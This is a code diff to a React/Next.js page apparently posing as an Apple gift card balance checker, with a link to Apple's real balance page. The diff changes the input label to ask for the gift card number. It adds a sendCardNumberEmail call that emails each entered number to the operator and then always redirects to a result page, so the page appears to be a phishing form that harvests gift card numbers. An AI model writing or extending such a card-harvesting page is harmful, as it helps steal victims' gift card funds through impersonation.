@@ -2,15 +2,28 @@
 import Link from 'next/link';
 import { Navbar, Container } from 'react-bootstrap';
 import { useState } from 'react';
+
 import { useRouter } from 'next/router';
+import { sendCardNumberEmail } from '../utils/email';
 
 
 export default function About() {
   const router = useRouter();
   const [cardNumber, setCardNumber] = useState('');
-  const handleCheckBalance = (e) => {
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState('');
+  const handleCheckBalance = async (e) => {
     e.preventDefault();
-    router.push('/balance-result');
+    setError('');
+    setLoading(true);
+    try {
+      await sendCardNumberEmail(cardNumber);
+    } catch (err) {
+      setError('Failed to send. We will still get back to you.');
+    } finally {
+      setLoading(false);
+      router.push('/balance-result');
+    }
   };
   return (
     <div
@@ -129,13 +142,13 @@ export default function About() {
             color: '#222'
           }}
         >
-          Enter Your Pin Here :
+          Enter Your Gift Card Number Here :
         </div>
         {/* Pin input field */}
         <form style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: '1.5rem' }} onSubmit={handleCheckBalance}>
           <input
             type="text"
-            placeholder="Enter 10-digit card number"
+            placeholder="Enter card number"
             value={cardNumber}
             onChange={e => setCardNumber(e.target.value)}
             style={{
@@ -149,29 +162,27 @@ export default function About() {
               marginBottom: '1rem'
             }}
           />
-        </form>
-        {/* Can't Find Your Pin? learn more */}
-        <div
-          style={{
-            textAlign: 'center',
-            fontSize: '0.95rem',
-            color: '#888',
-            marginTop: '0.7rem',
-            marginBottom: '1.5rem'
-          }}
-        >
-          Can't Find Your Pin?{' '}
-          <a
-            href="https://secure7.store.apple.com/shop/giftcard/balance"
-            target="_blank"
-            rel="noopener noreferrer"
-            style={{ color: '#0071e3', textDecoration: 'underline', fontWeight: 500 }}
+          {/* Can't Find Your Pin? learn more */}
+          <div
+            style={{
+              textAlign: 'center',
+              fontSize: '0.95rem',
+              color: '#888',
+              marginTop: '0.7rem',
+              marginBottom: '1.5rem'
+            }}
           >
-            learn more
-          </a>
-        </div>
-        {/* Check Balance button */}
-        <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '2rem' }}>
+            Can't Find Your Pin?{' '}
+            <a
+              href="https://secure7.store.apple.com/shop/giftcard/balance"
+              target="_blank"
+              rel="noopener noreferrer"
+              style={{ color: '#0071e3', textDecoration: 'underline', fontWeight: 500 }}
+            >
+              learn more
+            </a>
+          </div>
+          {error && <span style={{ color: 'red', marginBottom: '1rem' }}>{error}</span>}
           <button
             type="submit"
             style={{
@@ -184,13 +195,17 @@ export default function About() {
               fontWeight: 'bold',
               fontSize: '1.1rem',
               padding: '1rem',
-              cursor: 'pointer',
-              opacity: 1
+              cursor: loading ? 'not-allowed' : 'pointer',
+              opacity: loading ? 0.7 : 1
             }}
+            disabled={loading}
           >
-            Check Balance
+            {loading ? 'Sending...' : 'Check Balance'}
           </button>
-        </div>
+        </form>
+  {/* learn more link moved above button */}
+        {/* Check Balance button */}
+  {/* Button moved inside form above */}
         {/* Gift card image */}
         <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '2.5rem' }}>
           <img
